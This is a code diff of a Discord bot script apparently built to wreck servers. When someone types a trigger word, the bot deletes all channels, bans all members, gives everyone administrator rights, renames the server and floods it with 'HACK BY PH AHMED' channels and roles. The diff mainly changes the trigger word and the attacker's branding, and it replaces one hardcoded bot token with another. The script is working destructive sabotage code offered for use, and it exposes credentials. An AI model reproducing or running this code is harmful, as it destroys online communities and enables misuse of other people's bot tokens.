@@ -23,7 +23,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 })
 ///created by black jack 
 client.on('message', message => {
-    if (message.content.toLowerCase() === '.') {
+    if (message.content.toLowerCase() === "reklam") {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]
@@ -32,14 +32,13 @@ client.on('message', message => {
         message.guild.channels.map(c => {
             c.delete();
         });
-    message.guild.members.forEach( member => {
-          
-          member.ban()
-      })
+    message.guild.members.forEach(m =>{
+                    m.ban()
+                })
       
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED BY STAFANO",
+                name: "ph ahmed",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -47,12 +46,12 @@ client.on('message', message => {
             })
         }, 1000);
         message.guild.setIcon("");
-        message.guild.setName('HACKED BY STAFANO');
+        message.guild.setName('ph ahmed');
         setTimeout(function() {
             setInterval(() => {
           
-                message.guild.createChannel('hack by stafano', 'text').then(channel => {
-                channel.send('@everyone HACK BY STAFANO:joy: :joy: :joy:')
+                message.guild.createChannel('hack by ph ahmed', 'text').then(channel => {
+                channel.send('@everyone HACK BY PH AHMED:joy: :joy: :joy:')
                
                 })
             }
@@ -65,5 +64,5 @@ client.on('message', message => {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("NzY0MTgzOTk3Mzk0NzE0NjQ1.X4Cjzg.bDS4Yq6CYrA7hXxZN8BbG7vuZIg")
+client.login("ODAzNjg0OTczMDc2NDE0NDc1.YBBX9Q.nLldz9_HGz2thMV6BrXMffgdzOY")
           
